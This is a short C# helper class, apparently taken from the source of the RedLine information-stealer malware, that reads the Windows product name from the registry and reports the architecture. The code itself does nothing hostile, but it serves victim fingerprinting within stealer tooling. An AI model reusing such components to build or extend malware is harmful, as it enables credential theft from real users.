using Microsoft.Win32;
using System;

namespace RedLine.Logic.Helpers
{
	public static class OsDetector
	{
		private static string HKLM_GetString(string key, string value)
		{
			try
			{
				return Registry.LocalMachine.OpenSubKey(key)?.GetValue(value).ToString() ?? string.Empty;
			}
			catch
			{
				return string.Empty;
			}
		}

		public static string GetWindowsVersion()
		{
			string str;
			try
			{
				str = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
			}
			catch (Exception)
			{
				str = "x86";
			}
			string text = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
			if (!string.IsNullOrEmpty(text))
			{
				return text + " " + str;
			}
			return string.Empty;
		}
	}
}
